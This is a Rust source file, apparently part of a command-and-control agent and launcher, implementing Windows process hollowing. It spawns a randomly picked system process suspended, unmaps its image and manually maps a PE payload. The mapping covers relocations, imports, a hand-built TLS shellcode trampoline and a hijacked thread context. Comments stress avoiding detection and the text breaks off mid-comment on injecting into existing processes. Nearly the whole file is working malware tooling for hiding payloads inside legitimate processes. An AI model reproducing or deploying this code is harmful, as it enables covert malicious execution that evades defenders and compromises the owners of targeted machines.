//! Windows process-hollowing primitive.
//!
//! Spawns `C:\Windows\System32\svchost.exe` suspended, unmaps its original
//! image, and replaces it with a PE payload. The payload is manually mapped by
//! parsing PE headers, copying sections to their virtual addresses, applying
//! base relocations, and resolving imports. Used for both the agent's
//! `MigrateAgent` capability and the launcher's in-memory payload execution.

use anyhow::{anyhow, Result};
use std::ffi::{CStr, OsStr};
use winapi::ctypes::c_void;
use std::mem::{size_of, zeroed};
use std::os::windows::ffi::OsStrExt;
use winapi::shared::minwindef::{FARPROC, HMODULE};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{
    ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
};
use winapi::um::processthreadsapi::{
    CreateProcessW, CreateRemoteThread, GetThreadContext, OpenProcess, ResumeThread,
    SetThreadContext, TerminateProcess, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS,
    IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
    IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, IMAGE_SNAP_BY_ORDINAL, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, PAGE_READONLY,
    PAGE_READWRITE, PVOID,
};
use winapi::um::winnt::{
    PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

/// Native `PROCESS_BASIC_INFORMATION` layout (class 0 of `NtQueryInformationProcess`).
/// Defined here rather than imported because `winapi` 0.3 does not re-export it.
#[repr(C)]
#[allow(non_snake_case)]
struct PROCESS_BASIC_INFORMATION {
    ExitStatus: i32,
    PebBaseAddress: PVOID,
    AffinityMask: usize,
    BasePriority: i32,
    UniqueProcessId: usize,
    InheritedFromUniqueProcessId: usize,
}

#[link(name = "ntdll")]
extern "C" {
    fn NtCreateThreadEx(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: PVOID,
        ProcessHandle: HANDLE,
        StartRoutine: PVOID,
        Argument: PVOID,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: PVOID,
    ) -> i32;
    fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> i32;
    fn NtQueryInformationProcess(
        ProcessHandle: HANDLE,
        ProcessInformationClass: u32,
        ProcessInformation: *mut c_void,
        ProcessInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
}

/// Translate an RVA into a flat-file offset using the payload's section table.
/// Returns `None` if the RVA does not fall inside any section.
unsafe fn rva_to_file_offset(
    payload: &[u8],
    nt_headers_offset: usize,
    num_sections: u16,
    rva: u32,
) -> Option<usize> {
    let section_headers_offset = nt_headers_offset + size_of::<IMAGE_NT_HEADERS>();
    for i in 0..num_sections {
        let sh: &IMAGE_SECTION_HEADER = &*((payload.as_ptr() as usize
            + section_headers_offset
            + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
            as *const IMAGE_SECTION_HEADER);
        let sva = sh.VirtualAddress;
        let svs = *sh.Misc.VirtualSize();
        // Some linkers leave VirtualSize zero and use SizeOfRawData instead.
        let size = if svs == 0 { sh.SizeOfRawData } else { svs };
        if rva >= sva && rva < sva.saturating_add(size) {
            let delta = rva - sva;
            return Some((sh.PointerToRawData as usize).saturating_add(delta as usize));
        }
    }
    None
}

/// Read a NUL-terminated ASCII string out of `process` starting at `remote_addr`.
/// Stops after `MAX` bytes to bound pathological inputs.
unsafe fn read_remote_cstr(process: HANDLE, remote_addr: usize) -> Result<String> {
    const MAX: usize = 1024;
    let mut out = Vec::with_capacity(64);
    let mut byte = [0u8; 64];
    let mut cursor = remote_addr;
    while out.len() < MAX {
        let mut bytes_read: usize = 0;
        if ReadProcessMemory(
            process,
            cursor as *const c_void,
            byte.as_mut_ptr() as *mut c_void,
            byte.len(),
            &mut bytes_read,
        ) == 0
            || bytes_read == 0
        {
            return Err(anyhow!(
                "ReadProcessMemory for remote C string failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        for &b in &byte[..bytes_read] {
            if b == 0 {
                return String::from_utf8(out)
                    .map_err(|e| anyhow!("remote C string was not valid UTF-8: {e}"));
            }
            out.push(b);
            if out.len() >= MAX {
                break;
            }
        }
        cursor += bytes_read;
    }
    Err(anyhow!("remote C string exceeded {} bytes", MAX))
}

/// RAII guard that terminates the hollowed process and closes both handles if
/// an error occurs after `CreateProcessW`. Call `disarm()` on the success path
/// to prevent cleanup.
struct ProcessGuard {
    pi: PROCESS_INFORMATION,
    active: bool,
}

impl ProcessGuard {
    fn new(pi: PROCESS_INFORMATION) -> Self {
        Self { pi, active: true }
    }
    /// Prevent cleanup — call this just before returning `Ok`.
    fn disarm(&mut self) {
        self.active = false;
    }
}

impl Drop for ProcessGuard {
    fn drop(&mut self) {
        if self.active {
            unsafe {
                TerminateProcess(self.pi.hProcess, 1);
                CloseHandle(self.pi.hProcess);
                CloseHandle(self.pi.hThread);
            }
        }
    }
}

/// Spawn a host process suspended and run `payload` in its address space.
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    if payload.len() < size_of::<IMAGE_DOS_HEADER>() {
        return Err(anyhow!("payload too small to contain DOS header"));
    }
    let dos_header = unsafe { &*(payload.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        return Err(anyhow!("invalid DOS magic"));
    }
    let nt_headers_offset = dos_header.e_lfanew as usize;
    if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
        return Err(anyhow!("payload truncated before NT headers"));
    }
    let nt_headers =
        unsafe { &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS) };
    if nt_headers.Signature != 0x00004550 {
        return Err(anyhow!("invalid NT signature"));
    }

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
    
    let hosts = ["svchost.exe", "taskhostw.exe", "RuntimeBroker.exe", "sihost.exe"];
    let host = hosts[rand::Rng::gen_range(&mut rand::thread_rng(), 0..hosts.len())];
    let svchost_path = format!("{}\\System32\\{}", system_root, host);

    let cmd: Vec<u16> = OsStr::new(&svchost_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmd.as_ptr() as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(anyhow!(
            "CreateProcessW failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // From this point any error must terminate the suspended process and close
    // both handles; the guard does that automatically via Drop.
    let mut guard = ProcessGuard::new(pi);
    let pi = guard.pi; // shadow the local so all subsequent code uses the guard's copy via NtQueryInformationProcess(ProcessBasicInformation)
                        // and read the `ImageBaseAddress` field out of the remote PEB.
    let mut base_addr_ptr: PVOID = std::ptr::null_mut();
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let info_class: u32 = 0; // ProcessBasicInformation
    let mut return_length: u32 = 0;
    unsafe {
        let status = NtQueryInformationProcess(
            pi.hProcess,
            info_class,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );
        if status == 0 && !pbi.PebBaseAddress.is_null() {
            // PEB.ImageBaseAddress lives at offset 0x10 on x64 (0x08 on x86).
            #[cfg(target_arch = "x86_64")]
            const IMAGE_BASE_OFFSET: usize = 0x10;
            #[cfg(target_arch = "x86")]
            const IMAGE_BASE_OFFSET: usize = 0x08;
            let mut image_base_addr: [u8; size_of::<usize>()] = [0; size_of::<usize>()];
            let mut bytes_read: usize = 0;
            if ReadProcessMemory(
                pi.hProcess,
                (pbi.PebBaseAddress as usize + IMAGE_BASE_OFFSET) as *const _,
                image_base_addr.as_mut_ptr() as *mut _,
                size_of::<usize>(),
                &mut bytes_read,
            ) != 0
            {
                base_addr_ptr = usize::from_ne_bytes(image_base_addr) as PVOID;
            }
        }
        if base_addr_ptr.is_null() {
            // Fallback: read PEB base from the suspended thread's context.
            // On x64 the initial rdx holds the PEB; on x86 it is ebx.
            let mut ctx: CONTEXT = zeroed();
            ctx.ContextFlags = CONTEXT_FULL;
            if GetThreadContext(pi.hThread, &mut ctx) == 0 {
                return Err(anyhow!(
                    "GetThreadContext failed: {}",
                    std::io::Error::last_os_error()
                ));
            }
            #[cfg(target_arch = "x86_64")]
            let peb_addr = ctx.Rdx as *const u8;
            #[cfg(target_arch = "x86")]
            let peb_addr = ctx.Ebx as *const u8;

            let mut image_base_addr: [u8; size_of::<usize>()] = [0; size_of::<usize>()];
            let mut bytes_read: usize = 0;
            if ReadProcessMemory(
                pi.hProcess,
                (peb_addr as usize + 0x10) as *const _,
                image_base_addr.as_mut_ptr() as *mut _,
                size_of::<usize>(),
                &mut bytes_read,
            ) == 0
            {
                return Err(anyhow!(
                    "ReadProcessMemory for PEB failed: {}",
                    std::io::Error::last_os_error()
                ));
            }
            base_addr_ptr = usize::from_ne_bytes(image_base_addr) as PVOID;
        }
    }

    if !base_addr_ptr.is_null() {
        let res = unsafe { NtUnmapViewOfSection(pi.hProcess, base_addr_ptr) };
        if res != 0 {
            // Failure to unmap the original image is unrecoverable: proceeding
            // would leave the host code resident (increasing detection risk) and
            // risk a failed VirtualAllocEx at the preferred ImageBase. Terminate
            // the suspended process (the guard handles cleanup) and return an error.
            return Err(anyhow!(
                "NtUnmapViewOfSection failed with NTSTATUS {:#x}; aborting hollow to prevent \
                 detection risk and degraded injection",
                res
            ));
        }
    }

    // Allocate new memory for the payload
    let image_base = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            nt_headers.OptionalHeader.ImageBase as *mut _,
            nt_headers.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    let (image_base, is_relocated) = if image_base.is_null() {
        // Allocation at preferred address failed, try anywhere
        let new_base = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                std::ptr::null_mut(),
                nt_headers.OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if new_base.is_null() {
            return Err(anyhow!(
                "VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        (new_base, true)
    } else {
        (image_base, false)
    };

    // Update PEB.ImageBaseAddress to the new allocation so that
    // GetModuleHandle(NULL), CRT init, and TLS access all see the correct base.
    if !pbi.PebBaseAddress.is_null() {
        #[cfg(target_arch = "x86_64")]
        const IMAGE_BASE_OFFSET: usize = 0x10;
        #[cfg(target_arch = "x86")]
        const IMAGE_BASE_OFFSET: usize = 0x08;
        let new_base_val = image_base as usize;
        let mut peb_written: usize = 0;
        unsafe {
            WriteProcessMemory(
                pi.hProcess,
                (pbi.PebBaseAddress as usize + IMAGE_BASE_OFFSET) as *mut _,
                &new_base_val as *const _ as *const _,
                size_of::<usize>(),
                &mut peb_written,
            );
        }
    }

    // Copy headers
    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            image_base,
            payload.as_ptr() as *const _,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        )
    };
    if ok == 0 {
        return Err(anyhow!(
            "WriteProcessMemory for headers failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Copy sections
    let section_headers_offset = nt_headers_offset + size_of::<IMAGE_NT_HEADERS>();
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };

        let section_dest = (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
        let section_src =
            (payload.as_ptr() as usize + section_header.PointerToRawData as usize) as *const u8;

        let mut written: usize = 0;
        let ok = unsafe {
            WriteProcessMemory(
                pi.hProcess,
                section_dest,
                section_src as *const _,
                section_header.SizeOfRawData as usize,
                &mut written,
            )
        };
        if ok == 0 {
            return Err(anyhow!(
                "WriteProcessMemory for section {} failed: {}",
                String::from_utf8_lossy(&section_header.Name),
                std::io::Error::last_os_error()
            ));
        }
    }

    // Perform base relocations if needed
    if is_relocated {
        let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
        let reloc_dir =
            &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        if reloc_dir.VirtualAddress > 0 && reloc_dir.Size > 0 {
            // The relocation directory's VirtualAddress is an RVA, not a file
            // offset. Translate it to a file offset so we read from the right
            // place in the flat payload buffer.
            let reloc_file_offset = match unsafe {
                rva_to_file_offset(
                    payload,
                    nt_headers_offset,
                    nt_headers.FileHeader.NumberOfSections,
                    reloc_dir.VirtualAddress,
                )
            } {
                Some(o) => o,
                None => {
                    return Err(anyhow!(
                        "relocation RVA {:#x} does not map to any section",
                        reloc_dir.VirtualAddress
                    ));
                }
            };
            let mut current_reloc_block_offset = reloc_file_offset;
            let reloc_end = reloc_file_offset + reloc_dir.Size as usize;
            if reloc_end > payload.len() {
                return Err(anyhow!("relocation directory overruns payload buffer"));
            }

            // Relocation walk overview
            // ------------------------
            // The relocation directory is read from the **local `payload`
            // buffer** (our process's address space), never from the remote
            // process.  Block headers and entries are therefore guaranteed to
            // be pristine while we iterate \u2014 no risk of a previous patch
            // overwriting a header we have not yet read.
            //
            // For every relocatable address we then perform a
            // ReadProcessMemory / WriteProcessMemory round-trip against the
            // **remote** process.  We read the un-relocated value (the value
            // the linker baked in at the preferred ImageBase) and add `delta`
            // (= actual_base - preferred_base) before writing it back.
            //
            // Reading from the remote first \u2014 rather than reading from the
            // local payload buffer \u2014 is necessary because the section copy
            // step may already have applied other writes to the remote image
            // (e.g. import resolution); we want to apply the delta to whatever
            // is actually mapped, not to the on-disk template.  Since we have
            // not yet patched any relocation site, the remote value is still
            // the original linker output.
            while current_reloc_block_offset < reloc_end {
                let reloc_block_header: &IMAGE_BASE_RELOCATION = unsafe {
                    &*((payload.as_ptr() as usize + current_reloc_block_offset)
                        as *const IMAGE_BASE_RELOCATION)
                };
                let block_size = reloc_block_header.SizeOfBlock as usize;
                if block_size < size_of::<IMAGE_BASE_RELOCATION>() {
                    break;
                }
                let num_entries =
                    (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();

                for i in 0..num_entries {
                    let entry_offset = current_reloc_block_offset
                        + size_of::<IMAGE_BASE_RELOCATION>()
                        + (i * size_of::<u16>());
                    let entry = unsafe { *(payload.as_ptr().add(entry_offset) as *const u16) };
                    let reloc_type = entry >> 12;
                    let reloc_offset = entry & 0x0FFF;

                    // The relocation directory (and headers) is NOT written to the remote process's
                    // memory. Therefore, we MUST read reloc_block_header.VirtualAddress and the
                    // relocation entries from our local `payload` buffer, combining it with the remote
                    // image base to calculate the remote patch address.
                    let patch_base = image_base as usize
                        + reloc_block_header.VirtualAddress as usize
                        + reloc_offset as usize;
                    if reloc_type == IMAGE_REL_BASED_DIR64 {
                        let patch_addr = patch_base as *mut c_void;
                        let mut orig: i64 = 0;
                        let mut bytes_read: usize = 0;
                        unsafe {
                            if winapi::um::memoryapi::ReadProcessMemory(
                                pi.hProcess,
                                patch_addr,
                                &mut orig as *mut _ as *mut _,
                                size_of::<i64>(),
                                &mut bytes_read,
                            ) == 0
                            {
                                continue;
                            }
                        }
                        let new_addr = orig + delta as i64;
                        let mut bytes_written: usize = 0;
                        unsafe {
                            WriteProcessMemory(
                                pi.hProcess,
                                patch_addr,
                                &new_addr as *const _ as *const _,
                                size_of::<i64>(),
                                &mut bytes_written,
                            );
                        }
                    } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
                        let patch_addr = patch_base as *mut c_void;
                        let mut orig: u32 = 0;
                        let mut bytes_read: usize = 0;
                        unsafe {
                            if winapi::um::memoryapi::ReadProcessMemory(
                                pi.hProcess,
                                patch_addr,
                                &mut orig as *mut _ as *mut _,
                                size_of::<u32>(),
                                &mut bytes_read,
                            ) == 0
                            {
                                continue;
                            }
                        }
                        let new_addr = (orig as i64 + delta as i64) as u32;
                        let mut bytes_written: usize = 0;
                        unsafe {
                            WriteProcessMemory(
                                pi.hProcess,
                                patch_addr,
                                &new_addr as *const _ as *const _,
                                size_of::<u32>(),
                                &mut bytes_written,
                            );
                        }
                    }
                }
                current_reloc_block_offset += block_size;
            }
        }
    }

    // Resolve imports.
    //
    // The headers and import tables were written into the *child* process's
    // address space; we cannot dereference those virtual addresses directly
    // from the parent. Read descriptors/thunks via ReadProcessMemory, resolve
    // each function locally with LoadLibraryA/GetProcAddress (which operate
    // on the parent's address space), then write resolved addresses back
    // into the child's IAT with WriteProcessMemory.
    let import_dir =
        &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress > 0 {
        let mut import_desc_offset = import_dir.VirtualAddress as usize;
        loop {
            let mut import_desc: IMAGE_IMPORT_DESCRIPTOR = unsafe { zeroed() };
            let mut bytes_read: usize = 0;
            let remote_desc_addr = (image_base as usize + import_desc_offset) as *const c_void;
            unsafe {
                if ReadProcessMemory(
                    pi.hProcess,
                    remote_desc_addr,
                    &mut import_desc as *mut _ as *mut c_void,
                    size_of::<IMAGE_IMPORT_DESCRIPTOR>(),
                    &mut bytes_read,
                ) == 0
                {
                    return Err(anyhow!(
                        "ReadProcessMemory(import descriptor) failed: {}",
                        std::io::Error::last_os_error()
                    ));
                }
            }
            if import_desc.Name == 0 {
                break;
            }

            // Read the DLL name out of the child.
            let lib_name = unsafe {
                read_remote_cstr(pi.hProcess, image_base as usize + import_desc.Name as usize)?
            };
            let lib_name_c = std::ffi::CString::new(lib_name.as_bytes())
                .map_err(|e| anyhow!("invalid import DLL name: {e}"))?;
            let lib_handle = unsafe { LoadLibraryA(lib_name_c.as_ptr()) };
            if lib_handle.is_null() {
                return Err(anyhow!(
                    "Failed to load library {}: {}",
                    lib_name,
                    std::io::Error::last_os_error()
                ));
            }

            // OriginalFirstThunk (Characteristics) = ILT: holds name/ordinal RVAs and
            // is never overwritten by the loader, so it is reliable for bound imports.
            // FirstThunk = IAT: we overwrite this with the resolved addresses.
            let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
            let first_thunk = import_desc.FirstThunk as usize;
            let ilt_base = if orig_first_thunk != 0 {
                orig_first_thunk
            } else {
                first_thunk
            };
            let mut read_offset = ilt_base;
            let mut write_offset = first_thunk;
            loop {
                let remote_ilt_addr = (image_base as usize + read_offset) as *const c_void;
                let remote_iat_addr = (image_base as usize + write_offset) as *mut c_void;
                let mut func_addr_val: usize = 0;
                unsafe {
                    if ReadProcessMemory(
                        pi.hProcess,
                        remote_ilt_addr,
                        &mut func_addr_val as *mut _ as *mut c_void,
                        size_of::<usize>(),
                        &mut bytes_read,
                    ) == 0
                    {
                        return Err(anyhow!(
                            "ReadProcessMemory(thunk) failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                }
                if func_addr_val == 0 {
                    break;
                }

                let proc_addr: FARPROC = if IMAGE_SNAP_BY_ORDINAL(func_addr_val as u64) {
                    let ordinal = (func_addr_val & 0xFFFF) as u16;
                    unsafe { GetProcAddress(lib_handle, ordinal as *const i8) }
                } else {
                    // func_addr_val is an RVA pointing at an IMAGE_IMPORT_BY_NAME
                    // (WORD Hint; CHAR Name[...]). The name starts at +2.
                    let name_remote = image_base as usize + func_addr_val + 2;
                    let func_name = unsafe { read_remote_cstr(pi.hProcess, name_remote)? };
                    let func_name_c = std::ffi::CString::new(func_name.as_bytes())
                        .map_err(|e| anyhow!("invalid imported function name: {e}"))?;
                    unsafe { GetProcAddress(lib_handle, func_name_c.as_ptr()) }
                };

                if proc_addr.is_null() {
                    return Err(anyhow!("Failed to resolve function in {}", lib_name));
                }

                let mut written: usize = 0;
                unsafe {
                    if WriteProcessMemory(
                        pi.hProcess,
                        remote_iat_addr,
                        &proc_addr as *const _ as *const _,
                        size_of::<usize>(),
                        &mut written,
                    ) == 0
                    {
                        return Err(anyhow!("WriteProcessMemory for IAT failed"));
                    }
                }
                read_offset += size_of::<usize>();
                write_offset += size_of::<usize>();
            }
            import_desc_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
        }
    }

    // Set protection on sections
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };

        let addr = (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
        let size = *unsafe { section_header.Misc.VirtualSize() } as usize;
        let characteristics = section_header.Characteristics;
        let mut old_protect = 0;

        // Map PE section characteristics (IMAGE_SCN_MEM_EXECUTE = 0x20000000,
        // IMAGE_SCN_MEM_READ = 0x40000000, IMAGE_SCN_MEM_WRITE = 0x80000000)
        // to a single PAGE_* constant. Unlike section characteristic flags,
        // PAGE_* values are mutually exclusive and must not be OR-ed.
        let exec = characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = characteristics & IMAGE_SCN_MEM_READ != 0;
        let write = characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let new_protect: u32 = match (exec, read, write) {
            (true, _, true) => PAGE_EXECUTE_READWRITE,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };

        unsafe {
            if VirtualProtectEx(pi.hProcess, addr, size, new_protect, &mut old_protect) == 0 {
                tracing::warn!(
                    "VirtualProtectEx failed for section {}",
                    String::from_utf8_lossy(&section_header.Name)
                );
            }
        }
    }

    let mut entry_point =
        image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;

    // Invoke TLS callbacks (IMAGE_DIRECTORY_ENTRY_TLS = 9) before resuming the
    // main thread.  DLLs and EXEs compiled with __declspec(thread) / thread_local
    // rely on these callbacks for correct static initialization.
    //
    // Strategy: generate a small x64 shellcode trampoline that calls each
    // callback with (image_base, DLL_PROCESS_ATTACH=1, NULL) and then jumps to
    // the real entry point.  The trampoline replaces the thread's initial RIP
    // so the callbacks run on the main thread before any other code.
    #[cfg(target_arch = "x86_64")]
    {
        const TLS_DIR_IDX: usize = 9;
        const CALLBACKS_FIELD_OFFSET: usize = 3 * size_of::<usize>(); // 24 on x64
        let tls_entry = &nt_headers.OptionalHeader.DataDirectory[TLS_DIR_IDX];
        if tls_entry.VirtualAddress != 0 && tls_entry.Size > 0 {
            // The TLS directory was already written to the remote process and
            // base relocations were applied, so AddressOfCallBacks is a live VA.
            let tls_dir_remote = image_base as usize + tls_entry.VirtualAddress as usize;
            let callbacks_ptr_addr = tls_dir_remote + CALLBACKS_FIELD_OFFSET;
            let mut addr_of_callbacks: usize = 0;
            let mut bread: usize = 0;
            let got_cb_ptr = unsafe {
                ReadProcessMemory(
                    pi.hProcess,
                    callbacks_ptr_addr as *const _,
                    &mut addr_of_callbacks as *mut _ as *mut _,
                    size_of::<usize>(),
                    &mut bread,
                ) != 0
                    && addr_of_callbacks != 0
            };
            if got_cb_ptr {
                // Read the null-terminated callback VA array from the remote process.
                let mut tls_callbacks: Vec<usize> = Vec::new();
                let mut cb_ptr = addr_of_callbacks;
                loop {
                    let mut cb_fn: usize = 0;
                    let mut b: usize = 0;
                    if unsafe {
                        ReadProcessMemory(
                            pi.hProcess,
                            cb_ptr as *const _,
                            &mut cb_fn as *mut _ as *mut _,
                            size_of::<usize>(),
                            &mut b,
                        )
                    } == 0
                        || cb_fn == 0
                    {
                        break;
                    }
                    tls_callbacks.push(cb_fn);
                    cb_ptr += size_of::<usize>();
                }
                if !tls_callbacks.is_empty() {
                    // Build a minimal x64 trampoline:
                    //   For each callback:
                    //     sub  rsp, 0x28          ; shadow space + alignment
                    //     mov  rcx, <image_base>  ; DllBase
                    //     mov  edx, 1             ; DLL_PROCESS_ATTACH
                    //     xor  r8d, r8d           ; lpvReserved = NULL
                    //     mov  rax, <cb_va>
                    //     call rax
                    //     add  rsp, 0x28
                    //   mov  rax, <entry_point>
                    //   jmp  rax
                    let mut stub: Vec<u8> = Vec::new();
                    let ib = image_base as usize as u64;
                    for &cb in &tls_callbacks {
                        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp,0x28
                        stub.push(0x48);
                        stub.push(0xB9); // mov rcx, imm64
                        stub.extend_from_slice(&ib.to_le_bytes());
                        stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx,1
                        stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d,r8d
                        stub.push(0x48);
                        stub.push(0xB8); // mov rax, imm64
                        stub.extend_from_slice(&(cb as u64).to_le_bytes());
                        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp,0x28
                    }
                    stub.push(0x48);
                    stub.push(0xB8); // mov rax, imm64 (entry_point)
                    stub.extend_from_slice(&(entry_point as u64).to_le_bytes());
                    stub.extend_from_slice(&[0xFF, 0xE0]); // jmp rax

                    let stub_mem = unsafe {
                        VirtualAllocEx(
                            pi.hProcess,
                            std::ptr::null_mut(),
                            stub.len(),
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE,
                        )
                    };
                    if !stub_mem.is_null() {
                        let mut tw: usize = 0;
                        if unsafe {
                            WriteProcessMemory(
                                pi.hProcess,
                                stub_mem,
                                stub.as_ptr() as *const _,
                                stub.len(),
                                &mut tw,
                            )
                        } != 0
                        {
                            let mut old_protect = 0;
                            unsafe {
                                VirtualProtectEx(
                                    pi.hProcess,
                                    stub_mem,
                                    stub.len(),
                                    PAGE_EXECUTE_READ,
                                    &mut old_protect,
                                );
                            }
                            entry_point = stub_mem as usize;
                        }
                    }
                }
            }
        }
    }

    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_FULL;
    if unsafe { GetThreadContext(pi.hThread, &mut ctx) } == 0 {
        return Err(anyhow!(
            "GetThreadContext failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // We leave Rip pointing at the initial entry point (ntdll!RtlUserThreadStart).
    // RtlUserThreadStart calls LdrInitializeThunk, which handles process/thread
    // OS initialization (TLS slots, heap initialization, structured exception
    // handling vectors), which is required before the C runtime can boot natively.
    // By updating Rcx (or Eax) to point to the payload's entry point, wait.. No!
    // We already updated PEB.ImageBaseAddress, so LdrInitializeThunk will just 
    // natively call the AddressOfEntryPoint from the PE headers we wrote into the process.
    // However, LdrInitializeThunk will subsequently jump to the address specified in
    // Rcx/Eax (the lpStartAddress given to RtlUserThreadStart). So we must update that
    // register to our new entry point so execution naturally flows there, ensuring
    // that the CRT has full OS context during execution.
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rcx = entry_point as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        ctx.Eax = entry_point as u32;
    }
    if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
        return Err(anyhow!(
            "SetThreadContext failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Flush the instruction cache to ensure coherent execution
    unsafe {
        winapi::um::processthreadsapi::FlushInstructionCache(pi.hProcess, std::ptr::null(), 0);
    }

    if unsafe { ResumeThread(pi.hThread) } == u32::MAX {
        return Err(anyhow!(
            "ResumeThread failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    tracing::info!(pid = pi.dwProcessId, "hollowed payload running");
    // Success — disarm the guard so the process is not terminated, then close
    // the handles (the process continues running independently).
    guard.disarm();
    unsafe {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    Ok(())
}

/// Inject a PE `payload` into an **existing** process identified by `process`.
///
/// Unlike [`hollow_and_execute`] this function does **not** unmap or replace
/// the host process's original image.  It allocates a fresh region alongside
/// the existing code and starts a new thread at the payload's entry point,
/// which effectively runs a second agent instance inside the target process.
///
/// The caller is responsible for opening `process` with at least
/// `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
/// PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION` and for closing
/// the handle when done.  `PROCESS_QUERY_LIMITED_INFORMATION` is required so
/// that the routine can locate the remote PEB and update its
/// `ImageBaseAddress` field (see step 1b below).
///
/// **Side effect:** this function overwrites `PEB.ImageBaseAddress` in the
/// target process with the address of the freshly allocated region.  This is
/// necessary so that the injected payload's `GetModuleHandle(NULL)` calls,
/// CRT initialisation, and TLS access resolve to its own base rather than the
